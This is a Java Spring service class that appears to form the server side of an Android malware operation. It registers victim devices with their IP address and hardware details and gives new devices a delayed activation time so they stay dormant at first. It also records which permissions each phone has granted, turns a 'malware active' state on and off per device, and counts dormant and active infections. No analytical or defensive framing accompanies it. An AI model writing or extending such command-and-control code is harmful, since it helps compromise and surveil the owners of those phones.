// service/DeviceService.java
package com.bluewhale.service;

import com.bluewhale.dto.DeviceRegisterRequest;
import com.bluewhale.dto.PermissionGrantRequest;
import com.bluewhale.exception.DeviceNotFoundException;
import com.bluewhale.mapper.DeviceMapper;
import com.bluewhale.model.Device;
import com.bluewhale.repository.DeviceRepository;
import org.springframework.stereotype.Service;
import jakarta.transaction.Transactional;
import java.time.Instant;
import java.util.List;

@Service
public class DeviceService {

    private final DeviceRepository deviceRepository;

    public DeviceService(DeviceRepository deviceRepository) {
        this.deviceRepository = deviceRepository;
    }

    @Transactional
    public Device register(DeviceRegisterRequest req, String ip, int activationDelayHours) {
        return deviceRepository.findById(req.getDeviceId()).map(existing -> {
            DeviceMapper.updateLastSeen(existing);
            existing.setIpAddress(ip);
            existing.setDeviceName(req.getDeviceName());
            existing.setAndroidVersion(req.getAndroidVersion());
            existing.setManufacturer(req.getManufacturer());
            existing.setModel(req.getModel());
            return deviceRepository.save(existing);
        }).orElseGet(() -> {
            Device d = DeviceMapper.toEntity(req, ip);
            d.setActivationTime(Instant.now().plusSeconds(activationDelayHours * 3600L));
            return deviceRepository.save(d);
        });
    }

    @Transactional
    public void recordPermission(PermissionGrantRequest req) {
        Device d = get(req.getDeviceId());
        String perms = d.getPermissionsGranted();
        if (perms == null || perms.isBlank()) perms = "{}";
        perms = perms.substring(0, perms.length() - 1)
                + (perms.length() > 2 ? "," : "")
                + "\"" + req.getPermission() + "\":" + req.isGranted() + "}";
        d.setPermissionsGranted(perms);
        deviceRepository.save(d);
    }

    @Transactional
    public void touch(String deviceId) {
        deviceRepository.findById(deviceId).ifPresent(d -> {
            d.setLastSeen(Instant.now());
            deviceRepository.save(d);
        });
    }

    @Transactional
    public void activateMalware(String deviceId) {
        Device d = get(deviceId);
        d.setMalwareActive(true);
        d.setStatus("malware_active");
        deviceRepository.save(d);
    }

    @Transactional
    public void deactivateMalware(String deviceId) {
        Device d = get(deviceId);
        d.setMalwareActive(false);
        d.setStatus("active");
        deviceRepository.save(d);
    }

    public Device get(String deviceId) {
        return deviceRepository.findById(deviceId)
                .orElseThrow(() -> new DeviceNotFoundException(deviceId));
    }

    public List<Device> allDevices() {
        return deviceRepository.findAll();
    }

    public List<Device> malwareActiveDevices() {
        return deviceRepository.findByMalwareActiveTrue();
    }

    public long countDormant() {
        return deviceRepository.countByStatus("dormant");
    }

    public long countMalwareActive() {
        return deviceRepository.countByStatus("malware_active");
    }
}